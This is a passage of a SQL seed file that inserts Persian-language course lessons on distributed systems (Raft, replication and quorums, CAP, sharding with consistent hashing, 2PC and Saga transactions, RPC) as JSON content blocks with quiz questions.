می‌کند تا رهبر شود","وقتی مهلتِ بی‌ضربانی تمام شد"],["Leader","تنها نویسنده؛ ضربان و تکرار لاگ","با اکثریت آراء در یک Term"]]},{"k":"warn","title":"دام رایج","t":"خوشه اجماعی با تعداد زوج گره (مثلاً ۲ یا ۴). در ۲ گره، اکثریت یعنی هر دو — پس خرابی حتی یک گره کل خوشه را می‌خواباند؛ و در شبکه نصف‌شده، دو گره ۴تایی هیچ‌کدام اکثریت ۳تایی نمی‌گیرند و سیستم بی‌دلیل قفل می‌شود. خوشه‌های اجماعی را همیشه فرد نگه دار: ۳ برای شروع، ۵ برای تحمل دو خرابی."},{"k":"tip","title":"نکته حرفه‌ای","t":"Raft را خودت پیاده‌سازی نکن — etcd، ZooKeeper و خود دیتابیس‌ها (مثل CockroachDB) آن را برایت اجرا کرده‌اند. ولی یادبگیر تا بتوانی «عملیاتش» کنی: وقتی etcd سه‌گره‌ات زیر فشار election storm می‌گیرد یا leader transfer می‌خواهد، کسی که ترم و مهلت و quorum را می‌فهمد مشکل را در دقیقه حل می‌کند و بقیه در روز."},{"k":"h","t":"جمع‌بندی درس"},{"k":"list","items":["اجماع یعنی توافق روی حقیقت مشترک زیر خرابی — و Raft آن را به انتخاب رهبر، تکرار لاگ و ایمنی شکست.","Term و تک‌رأیی، رهبر یکتا را تضمین می‌کنند؛ مهلت تصادفی، انتخاب را سریع.","Commit یعنی اکثریت دارد — پس مرگ رهبر داده را نمی‌برد، فقط ~۲۰۰ms وقفه می‌اندازد."]}]'::jsonb, '[{"q":"چرا مهلتِ تبدیل‌شدن به نامزد «تصادفی» است؟","opts":["برای عدالت","تا دو گره همزمان نامزد نشوند و رأی‌ها تقسیم و انتخاب قفل نشود — تقریباً همیشه یکی زودتر بیدار می‌شود","تصادفی نیست","برای امنیت"],"ans":1,"why":"اگر همه مهلت یکسان داشتند، بعد از مرگ رهبر همه همزمان نامزد می‌شدند و هر دور بی‌نتیجه می‌ماند (Split Vote)؛ تصادفی‌سازی، هم‌زمانی را عملاً حذف می‌کند."},{"q":"«Commit شدن» یک ورودی در Raft دقیقاً یعنی چه؟","opts":["روی دیسک رهبر نوشته شد","روی اکثریت گره‌ها تکرار شد — پس حتی مرگ رهبر هم نمی‌تواند از دستش بدهد","به کلاینت جواب داد","روی همه گره‌ها نوشت"],"ans":1,"why":"اکثریت کلید است نه همه: اکثریت با هر اکثریتِ بعدی عضو مشترک دارد، پس ورودی commit‌شده در هر رهبر بعدی هم هست — این همان تضمین ایمنی Raft است."},{"q":"چرا هر گره در هر Term فقط یک رأی می‌دهد؟","opts":["برای سرعت","چون اگر دو نامزد بتوانند از یک گره رأی بگیرند، ممکن است همزمان دو رهبر «اکثریت» داشته باشند و تاریخچه شاخه شود","برای کاهش ترافیک","قرارداد سلیقه‌ای است"],"ans":1,"why":"تک‌رأیی + اکثریت با هم اثبات می‌کنند که در هر Term حداکثر یک رهبر ممکن است — و تاریخچه خطی، بدون شکاف می‌ماند."}]'::jsonb),
('ds-r4', 'dist', 'Replication و سازگاری؛ از Quorum تا CAP', 65, 4, '[{"k":"p","t":"هر بار که داده را روی چند ماشین کپی می‌کنی تا نمیرد، یک سوال جدید متولد می‌شود: کدام کپی را بخوانم؟ و هر جوابی که بدهی، یک مصالححه است — بین تازگی داده، سرعت پاسخ و تحمل خرابی."},{"k":"h","t":"رهبر-پیرو؛ رایج‌ترین شکل تکرار"},{"k":"p","t":"ساده‌ترین و پرکاربردترین الگو: یک رهبر (Primary) همه نوشتن‌ها را می‌گیرد و لاگ تغییرات را به پیروها (Replica) می‌فرستد؛ خواندن‌ها می‌توانند بین همه پخش شوند. سوال کلیدی «همگام یا ناهمگام» است: در تکرار همگام، رهبر تا پیرو تأیید نکند به کلاینت جواب نمی‌دهد — هیچ داده‌ای گم نمی‌شود ولی اگر پیرو کند شود، نوشتن‌ها قفل می‌شوند. در تکرار ناهمگام، رهبر بلافاصله جواب می‌دهد و پیروها با کمی تأخیر (Replication Lag) به‌روز می‌شوند — سریع و مقاوم، ولی اگر رهبر بمیرد، آخرین نوشتن‌ها ممکن است گم شوند و خواندن از پیروِ عقب‌مانده، داده قدیمی نشان می‌دهد. پست‌گریس و مای‌اس‌کیوال هر دو در پیش‌فرض ناهمگام‌اند — و داستان «پست گذاشتم و ندیدم» همان Replication Lag است."},{"k":"h","t":"ریاضیات Quorum؛ R + W > N"},{"k":"p","t":"در تکرار چندرهبره یا بدون‌رهبر (سبک Dynamo)، داده روی N کپی است و تو دو عدد انتخاب می‌کنی: W (چند کپی باید بنویسند تا نوشتن موفق شود) و R (چند کپی را بخوان و جدیدترین را بپذیر). فرمول جادویی: اگر R + W > N باشد، مجموعه خوانده‌شده و مجموعه نوشته‌شده حتماً عضو مشترک دارند — و آن عضو، آخرین نوشتن را دارد؛ پس خواندن همیشه جدیدترین مقدار را می‌بیند. با N=3: اگر W=2 و R=2 بگیری، سازگاری قوی‌تری داری و یک خرابی را تحمل می‌کنی؛ اگر W=1 و R=3 بگیری، نوشتن‌ها برق‌آسا ولی خواندن‌ها سنگین‌اند؛ و W=1/R=1 یعنی سرعت کامل و سازگاری صفر — هر خواندن ممکن است کپی قدیمی را بگیرد. Quorum یعنی خریدن سازگاری با پول دسترس‌پذیری، دقیقاً به اندازه‌ای که لازم داری."},{"k":"h","t":"CAP و چیزی که واقعاً انتخاب می‌کنی"},{"k":"p","t":"قضیه CAP می‌گوید در یک پارگی شبکه (Partition)، باید بین سازگاری (همه یک مقدار را ببینند) و دسترس‌پذیری (همه جواب بگیرند) یکی را انتخاب کنی — چون وقتی دو نیمه شبکه نمی‌توانند با هم حرف بزنند، یا نوشتن را در یکی‌شان رد می‌کنی (CP مثل ZooKeeper و HBase) یا اجازه می‌دهی هر دو بنویسند و بعداً آشتی کنی (AP مثل Cassandra و DynamoDB). ولی CAP تصویر کامل نیست چون پارگی همیشه نیست؛ مدل PACELC تکمیلش می‌کند: در حالت عادی هم انتخاب داری — بین تأخیر (Latency) و سازگاری (Consistency). تکرار ناهمگام یعنی «الان جواب بده، بعداً سازگار شو» و اکثر سیستم‌های AP دقیقاً همین‌اند: Cassandra با Quorum قابل‌تنظیم، DynamoDB با انتخاب Strongly Consistent Read یا Eventually Consistent — و این «قابل‌تنظیم‌بودن» خودِ مهندسی است: برای موجودی انبار، قوی؛ برای لایک پست، نهایتی."},{"k":"h","t":"مثال حل‌شده"},{"k":"code","lang":"txt","title":"یک فروشگاه، سه پیکربندی (N=3)","code":"پیکربندی ۱:  W=2  R=2   →  R+W=4 > 3  ✓ سازگار\n   نوشتن: ۲ تأیید لازم (یکی می‌تواند مرده باشد)\n   خواندن: ۲ پاسخ، جدیدترین برنده\n   تحمل: ۱ گره مرده — سیستم کامل کار می‌کند\n\nپیکربندی ۲:  W=3  R=1   →  R+W=4 > 3  ✓ سازگار\n   نوشتن: هر ۳ باید زنده باشند (حساس به خرابی)\n   خواندن: هر کپی‌ای — همیشه جدیدترین است\n   مناسب: داده کم‌نوشت، پرخوان (مثل تنظیمات)\n\nپیکربندی ۳:  W=1  R=1   →  R+W=2 ≤ 3  ✗\n   سریع‌ترین حالت ممکن — و خواندن می‌تواند\n   کپی قدیمی را بگیرد. مناسب: کشِ قابل‌چشم‌پوشی."},{"k":"list","items":["R+W>N یک تضمین ریاضی است نه تنظیم سلیقه‌ای: اشتراک عضو یعنی دیدن آخرین نوشتن.","پیکربندی ۲ نشان می‌دهد Quorum فقط تحمل خرابی نیست — می‌توانی هزینه را بین خواندن و نوشتن جابه‌جا کنی.","پیکربندی ۳ «اشتباه» نیست — اگر داده قدیمی قابل‌قبول باشد، سریع‌ترین انتخاب ممکن است. مهندسی یعنی انتخاب آگاهانه، نه انتخاب پیش‌فرض."]},{"k":"def","term":"سازگاری نهایتی (Eventual Consistency)","t":"تضمینی که می‌گوید: اگر نوشتن‌های جدید متوقف شوند، بالاخره همه کپی‌ها به یک مقدار همگرا می‌شوند — ولی نمی‌گوید کی، و تا آن لحظه خواندن‌های مختلف ممکن است مقدارهای مختلف ببینند. ضعیف‌ترین (و ارزان‌ترین و در دسترس‌ترین) مدل سازگاری است و پایه همه سیستم‌های AP؛ هنر طراحی، شناسایی جاهایی است که «نهایتی» کافی است و جاهایی که نیست."},{"k":"table","head":["مدل سازگاری","تضمین","مثال"],"rows":[["قوی (Linearizable)","هر خواندن، آخرین نوشتنِ همه را می‌بیند","ZooKeeper، Spanner"],["خواندنِ نوشتن‌های خود","حداقل تغییرات خودم را می‌بینم","Session Sticky روی رهبر"],["نهایتی","بالاخره همه همگرا می‌شوند","Cassandra پیش‌فرض، DNS"]]},{"k":"warn","title":"دام رایج","t":"خواندن از Replica بلافاصله بعد از نوشتن و تعجب از «ناپدیدشدن» داده — مثل ثبت دیدگاه و ندیدنش بعد از رفرش. درمان‌ها ساده‌اند: خواندن‌های حساسِ بعد از نوشتن را به رهبر بفرست (Read-Your-Writes)، یا از Session Token برای چسباندن کاربر به یک Replica استفاده کن — ولی اول باید بدانی سیستم‌ات ناهمگام است؛ اکثر این باگ‌ها از ندانستن همین یک کلمه می‌آیند."},{"k":"tip","title":"نکته حرفه‌ای","t":"برای هر داده‌ی سیستم‌ات، روی کاغذ بنویس: «اگر این داده ۳ ثانیه قدیمی نمایش داده شود، چه اتفاقی می‌افتد؟» اگر جواب «هیچی» است، نهایتی بخوان و لذت ببر؛ اگر جواب «پول گم می‌شود» است، قوی بخوان و هزینه‌اش را بپذیر. این یک جدول ساده، ۸۰٪ تصمیمات سازگاری محصول توست."},{"k":"h","t":"جمع‌بندی درس"},{"k":"list","items":["تکرار ناهمگام سریع و مقاوم است ولی Lag دارد؛ همگام قوی است ولی به کندترین گره وابسته.","R+W>N یعنی خواندن حتماً آخرین نوشتن را می‌بیند — سازگاری قابل‌خرید با دسترس‌پذیری.","CAP درباره روز پارگی است و PACELC درباره هر روز؛ در هر دو، انتخاب با توست."]}]'::jsonb, '[{"q":"با N=5، کدام ترکیب W و R سازگاری قوی می‌دهد؟","opts":["W=2, R=2","W=3, R=3 — چون 3+3=6 > 5","W=1, R=4","هیچ‌کدام"],"ans":1,"why":"شرط R+W>N است: ۳+۳=۶ که از ۵ بیشتر است پس خواندن و نوشتن حتماً اشتراک دارند. W=2/R=2 می‌شود ۴ که کافی نیست."},{"q":"تفاوت عملی CP و AP هنگام پارگی شبکه چیست؟","opts":["CP سریع‌تر است","CP نوشتن‌های نیمه‌ی اقلیت را رد می‌کند تا تاریخچه شاخه نشود؛ AP اجازه نوشتن می‌دهد و آشتی را به بعد موکول می‌کند","AP امن‌تر است","فرقی ندارند"],"ans":1,"why":"وقتی شبکه نصف شده، CP می‌گوید «تا مطمئن نشوم نمی‌نویسم» (درست ولی گاهی در دسترس نیست) و AP می‌گوید «بنویس، بعداً آشتی می‌کنیم» (همیشه در دسترس، گاهی ناسازگار)."},{"q":"Replication Lag چه باگی می‌سازد؟","opts":["کندی دیسک","خواندن از پیروِ عقب‌مانده، داده‌ای را نشان می‌دهد که قبل از آخرین نوشتن است — «ذخیره کردم ولی نیست»","حافظه پر می‌شود","رمزها لو می‌روند"],"ans":1,"why":"نوشتن روی رهبر Commit شده ولی هنوز به پیرو نرسیده؛ خواندن از آن پیرو، گذشته را نشان می‌دهد. راه‌حل: خواندن‌های حساس بعد از نوشتن را به رهبر بفرست."}]'::jsonb)
INSERT INTO lessons (id, course_id, title, minutes, sort_order, blocks, quiz) VALUES
('ds-r5', 'dist', 'تقسیم داده؛ Sharding و هش‌گذاری سازگار', 65, 5, '[{"k":"p","t":"وقتی یک دیتابیس دیگر همه داده را جا نمی‌دهد یا همه بار را تحمل نمی‌کند، راه‌حل افقی این است: داده را بین چند ماشین «تکه» کن. ولی از همان روز اول، یک تصمیم طراحی همه‌چیز را تعیین می‌کند: هر ردیف روی کدام ماشین زندگی می‌کند؟"},{"k":"h","t":"دو فلسفه تقسیم؛ بازه یا هش"},{"k":"p","t":"تقسیم بازه‌ای (Range) داده را مثل دفترچه تلفن می‌بُرد: از الف تا «م» روی Shard ۱، بقیه روی Shard ۲. مزیتش بزرگ است: پرس‌وجوهای بازه‌ای (همه کاربران «الف» تا «ی») فقط به یک Shard می‌روند — برای سری‌های زمانی و داده‌های مرتب عالی است. ولی دو دام دارد: نقاط داغ (همه نوشتن‌های «امروز» روی یک Shard می‌ریزد چون بازه زمانی آخر است) و نیاز به جابه‌جایی مرزها. تقسیم هشی کلید را از یک تابع هش رد می‌کند و باقیمانده را Shard می‌گیرد: توزیع یکنواخت و بدون نقطه داغ — ولی پرس‌وجوی بازه‌ای باید به «همه» Shardها برود (Scatter-Gather). این که کدام را انتخاب کنی، مستقیم از الگوی دسترسی داده می‌آید، نه از سلیقه."},{"k":"h","t":"هش‌گذاری سازگار؛ حلقه‌ای که جابه‌جایی را کوچک می‌کند"},{"k":"p","t":"مشکل تقسیم ساده با باقیمانده (key % N) این است که با تغییر N — یعنی اضافه یا حذف شدن حتی یک Shard — تقریباً همه کلیدها صاحب‌شان عوض می‌شود و باید جابه‌جا شوند: یک عملیات وحشتناک روی ترابایت‌ها داده. هش‌گذاری سازگار راه‌حل است: همه گره‌ها و همه کلیدها با هش روی یک حلقه ۳۶۰ درجه می‌نشینند و هر کلید متعلق است به اولین گره‌ای که بعد از آن (در جهت ساعت) قرار دارد. حالا وقتی گره‌ای اضافه می‌شود، فقط کلیدهای بین او و گره قبلی‌اش جابه‌جا می‌شوند — یعنی حدود 1/N از کلیدها، نه همه. و چون یک گره واقعی ممکن است بدشانسانه در جای شلوغ حلقه بنشیند، هر گره را با چند «گره مجازی» (مثلاً ۱۰۰ تا ۲۰۰ نقطه روی حلقه) پخش می‌کنند تا بار واقعاً متوازن شود. کاساندرا، ری‌اک و Memcached همه روی همین حلقه سوارند."},{"k":"h","t":"انتخاب کلید Shard؛ تصمیمی که برنمی‌گردد"},{"k":"p","t":"کلید Shard همان ستونی است که هَش‌اش تعیین می‌کند هر ردیف کجاست — و تغییرش بعداً یعنی Resharding کل داده. سه معیار دارد: کاردینالیته بالا (کلیدی مثل «وضعیت سفارش» که ۳ مقدار دارد فاجعه است — همه روی ۳ Shard متمرکز می‌شوند)، هم‌خوانی با الگوی پرس‌وجو (اگر همه پرس‌وجوها بر اساس user_id است، Shard هم بر اساس user_id باشد تا هر درخواست به یک Shard برود) و یکنواختی زمانی (شماره سفارش افزایشی یعنی همه نوشتن‌های لحظه روی یک Shard — همان نقطه داغ). وقتی هیچ کلیدی خوب نیست، ترکیب می‌کنند: user_id + bucket تصادفی. و واقعیت تلخ: Shard کم شروع نکن — از روز اول ۶۴ یا ۱۲۵ Shard منطقی بساز (حتی اگر همه روی ۳ ماشین فیزیکی باشند) تا بعداً فقط «نگاشت» عوض شود نه داده."},{"k":"h","t":"مثال حل‌شده"},{"k":"code","lang":"py","title":"هش‌گذاری سازگار در ۳۰ خط","code":"import hashlib\n\nRING = 360\ndef h(key: str) -> int:\n    d = hashlib.md5(key.encode()).hexdigest()\n    return int(d, 16) % RING          # جای key روی حلقه\n\ndef owner(key: str, nodes: list[str]) -> str:\n    \"\"\"اولین گره بعد از key در جهت ساعت\"\"\"\n    kh, placed = h(key), sorted((h(n), n) for n in nodes)\n    for pos, name in placed:          # دور حلقه می‌گردیم\n        if pos >= kh:\n            return name\n    return placed[0][1]               # از ۳۶۰ رد شد → اولین گره\n\nnodes = [''shard-A'', ''shard-B'', ''shard-C'']\nkeys  = [f''user:{i}'' for i in range(12)]\n\nbefore = {k: owner(k, nodes) for k in keys}\nafter  = {k: owner(k, nodes + [''shard-D'']) for k in keys}\n\nmoved = [k for k in keys if before[k] != after[k]]\nprint(f''{len(moved)} از {len(keys)} کلید جابه‌جا شد'')\n# با % ساده: همه ۱۲ تا عوض می‌شدند. با حلقه: ~۳ تا!"},{"k":"list","items":["owner فقط حلقه را از جای کلید شروع و اولین گره را برمی‌گرداند — کل منطق مالکیت همین است.","اضافه‌شدن shard-D فقط کلیدهای بین او و گره قبلی‌اش را می‌گیرد؛ بقیه تکان نمی‌خورند.","اعداد را مقایسه کن: باقیمانده ساده (key % 4) همه را جابه‌جا می‌کرد؛ حلقه فقط همسایه‌ها را — و این تفاوت، Resharding را از «پروژه یک‌ماهه» به «کار یک روز» تبدیل می‌کند."]},{"k":"def","term":"گره مجازی (Virtual Node / VNode)","t":"به‌جای نشاندن هر گره فیزیکی روی «یک» نقطه حلقه، آن را با ده‌ها نقطه (با نام‌های shard-A#1، shard-A#2 و…) پخش می‌کنند. نتیجه: بار بین گره‌ها واقعاً متوازن می‌شود حتی اگر هش‌ها خوش‌شانس نباشند، و بزرگ/کوچک‌کردن خوشه یعنی کم/زیاد‌کردن vnodeها — نه جابه‌جایی کل داده."},{"k":"table","head":["روش تقسیم","مزیت","مشکل اصلی","مثال"],"rows":[["بازه‌ای","پرس‌وجوی بازه روی یک Shard","نقطه داغ زمانی، مرزهای متحرک","HBase، سری زمانی"],["باقیمانده (key % N)","سادگی","تغییر N = جابه‌جایی همه","شروع‌های کوچک"],["هش سازگار","جابه‌جایی حداقلی، تعادل با vnode","پرس‌وجوی بازه = همه Shardها","Cassandra، DynamoDB"]]},{"k":"warn","title":"دام رایج","t":"Shard کردن بر اساس ID افزایشی (auto-increment) — چون همه نوشتن‌های «الان» بزرگ‌ترین ID را دارند و همه روی همان یک Shard آخر می‌ریزند: نقاط داغ کامل، بقیه Shardها بیکار. اگر مجبوری ID زمانی داشته باشی، ترکیبش کن (user_id یا هش پیشوند) یا از UUID/ULID استفاده کن که از نظر هشی پخش می‌شوند."},{"k":"tip","title":"نکته حرفه‌ای","t":"قبل از Shard کردن، مطمئن شو واقعاً لازم است: اول ایندکس، بعد کش، بعد Replica خواندن، و فقط بعد Shard — چون Shard کردن مالیات همیشگی است: هر پرس‌وجوی چند Shard کندتر است، تراکنش بین Shard دردناک و Resharding همیشه در کمین. تیم‌های با تجربه می‌گویند: Shard آخرین راه‌حل است، نه اولین."},{"k":"h","t":"جمع‌بندی درس"},{"k":"list","items":["بازه‌ای برای پرس‌وجوی بازه و داده زمانی؛ هشی برای یکنواختی — انتخاب از الگوی دسترسی می‌آید.","هش سازگار جابه‌جایی را به ~1/N کلیدها محدود می‌کند؛ vnodeها تعادل واقعی می‌سازند.","کلید Shard تصمیمی ابدی است: کاردینالیته بالا + هم‌خوانی با پرس‌وجو + یکنواختی زمانی."]}]'::jsonb, '[{"q":"چرا هش سازگار جابه‌جایی را کم می‌کند؟","opts":["هش سریع‌تر است","چون با ورود گره جدید فقط کلیدهای بین او و گره قبلی‌اش صاحب عوض می‌کنند — نه همه کلیدها","داده فشرده می‌شود","N تغییر نمی‌کند"],"ans":1,"why":"در حلقه، مالکیت یک «بازه» است نه یک باقیمانده؛ ورود گره فقط بازه‌ای به‌اندازه خودش را از همسایه قبلی می‌گیرد — بقیه حلقه دست‌نخورده می‌ماند."},{"q":"Shard بر اساس «وضعیت سفارش» چرا فاجعه است؟","opts":["کند است","کاردینالیته ۳-۴ تایی دارد: تقریباً همه داده روی چند Shard متمرکز می‌شود و بقیه خالی می‌مانند","امن نیست","امکان‌پذیر نیست"],"ans":1,"why":"کلید Shard باید داده را پخش کند؛ ستونی با چند مقدار محدود، کلید نیست — فقط چند سطل می‌سازد. کاردینالیته بالا شرط اول است."},{"q":"نقطه داغ (Hot Spot) در تقسیم بازه‌ای چرا رخ می‌دهد؟","opts":["هش ضعیف است","چون نوشتن‌های جدید همه به یک بازه (مثل «امروز» یا «آخرین IDها») می‌ریزند و آن بازه روی یک Shard است","RAM کم است","شبکه کند است"],"ans":1,"why":"داده زمانی و افزایشی ذاتاً «یک‌جا» است؛ وقتی Shardها بازه‌ای‌اند، همه ترافیک زنده روی یکی‌شان جمع می‌شود — در حالی که بقیه آرشیو را نگه داشته‌اند."}]'::jsonb),
('ds-r6', 'dist', 'تراکنش توزیع‌شده؛ از 2PC تا Saga', 70, 6, '[{"k":"p","t":"در یک دیتابیس، «یا همه یا هیچ» را ACID با قفل و لاگ تضمین می‌کند. ولی وقتی یک سفارش باید همزمان در سرویس سفارش، سرویس پرداخت و سرویس موجودی ثبت شود — و هر کدام دیتابیس خودش را دارد — قفل مشترکی وجود ندارد. تراکنش توزیع‌شده یعنی همین: ساختن «همه یا هیچ» از اجزایی که به هم اعتماد ندارند."},{"k":"h","t":"2PC؛ راه‌حل کلاسیک و زخم‌هایش"},{"k":"p","t":"Commit دوفازی (2PC) یک هماهنگ‌کننده (Coordinator) دارد: فاز اول، از همه شرکت‌کننده‌ها می‌پرسد «آماده‌ای؟» و هر کدام کارشان را انجام و لاگ می‌کنند و قول می‌دهند؛ فاز دوم، اگر همه بله گفتند «Commit کن» وگرنه «Rollback». روی کاغذ کامل است — همه یا هیچ واقعی. ولی در عمل سه زخم دارد: هماهنگ‌کننده تک‌نقطه شکست است (اگر بعد از «آماده‌باش» و قبل از «Commit» بمیرد، شرکت‌کننده‌ها با منابع قفل‌شده منتظر می‌مانند — مسدودسازی معروف 2PC)، قفل‌ها تا پایان هر دو فاز نگه داشته می‌شوند که توان را می‌خورد، و یک شرکت‌کننده کند، همه را معطل می‌کند. به همین دلیل 2PC را فقط جایی می‌بینی که تراکنش کوتاه و شرکت‌کننده‌ها محلی‌اند — مثل XA بین چند دیتابیس در یک دیتاسنتر — نه بین میکروسرویس‌های یک محصول."},{"k":"h","t":"Saga؛ تراکنش به‌سبک دنیای واقعی"},{"k":"p","t":"ساگا می‌گوید: به‌جای یک تراکنش بزرگِ قفل‌دار، زنجیره‌ای از تراکنش‌های محلی کوچک اجرا کن که هر کدام «جبران‌کننده» دارند: سفارش ثبت شد → اگر پرداخت شکست خورد، «لغو سفارش» اجرا می‌شود. دو سبک اجرا دارد: ارکستراسیون (یک سرویس مرکزی، مثل یک رهبر ارکستر، ترتیب و جبران‌ها را فرمان می‌دهد — ساده‌تر برای دیدن و دیباگ) و کرئوگرافی (هر سرویس رویدادِ کار خودش را منتشر می‌کند و بعدی با شنیدنش شروع می‌کند — مستقل‌تر ولی زنجیره را باید از روی رویدادها بازسازی کنی). ساگا سازگاری قوی نمی‌دهد — سازگاری «نهایتی» است: لحظه‌هایی هست که سفارش ثبت ولی پرداخت نشده؛ سیستم باید برای این «حالت‌های میانه» طراحی شده باشد، نه اینکه وانمود کند وجود ندارند."},{"k":"h","t":"Idempotency؛ ملاتی که همه‌چیز را نگه می‌دارد"},{"k":"p","t":"هر دو رویکرد بالا یک فرض مشترک دارند: عمل‌ها باید قابل‌تکرارِ بی‌خطر باشند — چون در دنیای توزیع‌شده، پیام‌ها دو بار می‌رسند، retryها اجرا می‌شوند و جبران‌ها تکرار می‌شوند. Idempotency یعنی اجرای دوم و سوم یک عمل، اثری بیشتر از اجرای اول ندارد: PUT با کلید مشخص، «تنظیم موجودی به ۵» (نه «کم کردن ۱») و کلید Idempotency برای POSTهای پرداخت. قاعده طلایی طراحی: به‌جای فرمان‌های نسبی، «وضعیت هدف» بفرست؛ و برای هر عملِ اثرگذار، یک کلید یکتا بگیر و نتیجه‌اش را ذخیره کن تا تکرارش همان نتیجه قبلی را برگرداند. بدون این ملات، هم 2PC و هم Saga زیر بار اولین اختلال شبکه ترک می‌خورند."},{"k":"h","t":"مثال حل‌شده"},{"k":"code","lang":"txt","title":"ساگای سفارش — ارکستراسیون","code":"ارکستراتور: OrderSaga\n\n  قدم ۱  [CreateOrder]      سفارش → وضعیت: PENDING\n          جبران: CancelOrder\n  قدم ۲  [ReserveStock]     موجودی → رزرو ۳ عدد\n          جبران: ReleaseStock\n  قدم ۳  [ChargePayment]    پرداخت → ۸۵۰٬۰۰۰ تومان ✗ شکست!\n          جبران: RefundPayment\n\n  → ارکستراتور زنجیره جبران را معکوس اجرا می‌کند:\n     ReleaseStock  (قدم ۲ را برمی‌گرداند)\n     CancelOrder   (قدم ۱ را برمی‌گرداند)\n\n  نتیجه نهایی: هیچ اثری نماند — «هیچ»ِ ماجرا.\n  توجه: Refund اجرا نشد چون Charge اصلاً موفق نشده بود؛\n  جبران فقط برای قدم‌های «موفق» اجرا می‌شود."},{"k":"list","items":["هر قدم یک تراکنش محلی کامل است — هیچ قفل توزیع‌شده‌ای وجود ندارد؛ فقط ترتیب و حافظه ارکستراتور.","هر قدم «جبران‌کننده» خودش را از قبل دارد — طراحی جبران، نیمه واقعی طراحی ساگاست.","شکست در قدم ۳ یعنی اجرای معکوس قدم‌های ۲ و ۱ — سیستم به حالت قبل برمی‌گردد، نه به حالت قفل‌شده.","لحظاتی بین قدم‌ها، وضعیت «میانه» بود (سفارش هست، پرداخت نیست) — کاربر و مانیتورینگ باید این را بدانند."]},{"k":"def","term":"تراکنش جبران‌کننده (Compensating Transaction)","t":"عملی که اثر تراکنش قبلی را از نظر کسب‌وکاری خنثی می‌کند — نه از نظر فنی: «لغو سفارش» ردیف را حذف نمی‌کند، وضعیتش را CANCELLED می‌گذارد و تاریخچه می‌سازد. جبران‌ها معمولاً به‌جای پاک‌کردن، «رد پای مثبت» می‌گذارند — چون در سیستم توزیع‌شده، تاریخچه تنها چیز قابل‌اعتماد است."},{"k":"table","head":["","2PC","Saga","Outbox + رویداد"],"rows":[["سازگاری","قوی (همه یا هیچ واقعی)","نهایتی با جبران","نهایتی، قابل‌اعتماد"],["قفل/توان","قفل بلند — توان پایین","بدون قفل توزیع‌شده","بدون قفل"],["تک‌نقطه شکست","هماهنگ‌کننده","ارکستراتور (قابل‌افزونگی)","خود دیتابیس"],["جای استفاده","چند دیتابیس محلی","جریان کاری بین سرویس‌ها","انتشار رویداد مطمئن"]]},{"k":"warn","title":"دام رایج","t":"جبران‌کننده‌ای که واقعاً جبران نمی‌کند — مثل «ارسال ایمیل» در وسط زنجیره: اگر قدم بعدی شکست خورد، ایمیل را نمی‌توان پس گرفت. قاعده: عمل‌های غیرقابل‌بازگشت را آخر زنجیره بگذار (اول رزروها و تغییرات قابل‌جبران، و فقط وقتی همه مطمئن شد، اطلاع‌رسانی) یا برای آن‌ها جبرانِ واقعی طراحی کن (ایمیل اصلاحی)."},{"k":"tip","title":"نکته حرفه‌ای","t":"هر endpoint نوشتنی را از روز اول با کلید Idempotency بساز — حتی اگر امروز تراکنش توزیع‌شده نداری. روزی که نیاز پیدا کنی (و پیدا می‌کنی)، کدی که تکرارپذیر است ساگایش را می‌توان در یک اسپرینت ساخت؛ کدی که نیست، اول باید کلش بازنویسی شود. این ارزان‌ترین بیمه‌ای است که در بک‌اند می‌توان خرید."},{"k":"h","t":"جمع‌بندی درس"},{"k":"list","items":["2PC قوی ولی مسدودکننده و وابسته به هماهنگ‌کننده است — برای سرویس‌های دور از هم مناسب نیست.","ساگا = زنجیره تراکنش‌های محلی با جبران‌کننده‌ها؛ سازگاری نهایتی و حالت‌های میانه را بپذیر.","Idempotency پیش‌شرط همه این‌هاست: عمل‌ها باید تکرارِ بی‌خطر باشند."]}]'::jsonb, '[{"q":"بزرگ‌ترین مشکل عملی 2PC چیست؟","opts":["پیچیدگی کد","اگر هماهنگ‌کننده وسط کار بمیرد، شرکت‌کننده‌ها با منابع قفل‌شده منتظر می‌مانند — مسدودسازی","کند بودن هش","نیاز به TLS"],"ans":1,"why":"بعد از «آماده‌باش»، شرکت‌کننده قول داده و قفل را نگه داشته؛ بدون فرمان نهایی هماهنگ‌کننده، نه Commit می‌تواند نه رها کردن — و بقیه تراکنش‌ها پشت قفل می‌مانند."},{"q":"در ساگا، بعد از شکستِ یک قدم چه اتفاقی می‌افتد؟","opts":["همه Rollback دیتابیسی می‌شوند","جبران‌کننده‌های قدم‌های موفقِ قبلی، به ترتیب معکوس اجرا می‌شوند تا اثر کسب‌وکاری خنثی شود","سیستم قفل می‌شود","دستی باید درست کرد"],"ans":1,"why":"ساگا Rollback ندارد — «جبران» دارد: هر قدم موفق، عمل معکوسِ کسب‌وکاری خودش را دارد و ارکستراتور آن‌ها را معکوس اجرا می‌کند."},{"q":"چرا «تنظیم موجودی به ۵» بهتر از «کم کردن ۱ موجودی» است؟","opts":["کوتاه‌تر است","چون Idempotent است: تکرارش اثری ندارد، ولی «کم کردن ۱» با هر تکرار یک عدد بیشتر کم می‌کند","سریع‌تر است","امن‌تر است"],"ans":1,"why":"در دنیایی که پیام‌ها دو بار می‌رسند، فرمان نسبی دو بار اثر می‌گذارد؛ وضعیت هدف هر چند بار اجرا شود به همان مقصد می‌رسد — و این زیربنای retry و جبران امن است."}]'::jsonb),
('ds-r7', 'dist', 'الگوهای ارتباطی؛ از RPC تا صف پیام', 60, 7, '[{"k":"p","t":"سرویس‌ها دو جور حرف می‌زنند: یا همین حالا جواب بخواهند (همگام) یا بگویند و بروند (ناهمگام). و باورت نمی‌شود چه بخش بزرگی از معماری، فقط همین یک انتخاب است — که چه چیزی همگام باشد و چه چیزی پشت صف بایستد."},{"k":"h","t":"RPC و gRPC؛ صدا زدنِ از راه دور"},{"k":"p","t":"ساده‌ترین ارتباط، شبیه صدا زدن یک تابع روی ماشین دیگر است: کلاینت درخواست می‌فرستد و مسدود می‌شود تا جواب بیاید. gRPC نسخه مهندسی‌شده مدرن است: قراردادش با Protobuf (باینری، فشرده، نسخه‌بندی‌شده)، انتقالش روی HTTP/2 (چندمسیره، سربرگ فشرده) و قابلیتش Streaming دوطرفه. ولی هر RPC یک خطر ذاتی دارد: زنجیره وابستگی. اگر سرویس الف برای پاسخ‌دادن به کاربر به ب و ج نیاز داشته باشد، تأخیرش مجموع آن‌هاست و خرابی هر کدام خرابی اوست. قانون عملی: روی «مسیر بحرانی» کاربر فقط RPCهای ضروری؛ هر چیز دیگری که می‌تواند صبر کند را از این مسیر بیرون ببر. و هرگز، هیچ RPC بدون timeout — این درس را قبلاً با هزینه یاد 